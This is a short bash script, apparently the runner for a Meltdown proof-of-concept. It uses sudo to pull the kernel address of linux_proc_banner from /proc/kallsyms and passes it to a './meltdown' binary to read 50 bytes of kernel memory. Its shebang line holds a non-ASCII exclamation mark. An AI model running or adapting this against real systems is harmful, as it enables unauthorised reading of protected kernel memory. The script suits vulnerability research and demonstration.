#！/bin/bash

a=$(sudo sed -n -re 's/^([0-9a-f]*[1-9a-f][0-9a-f]*) .* linux_proc_banner$/\1/p' /proc/kallsyms)
./meltdown $a 50
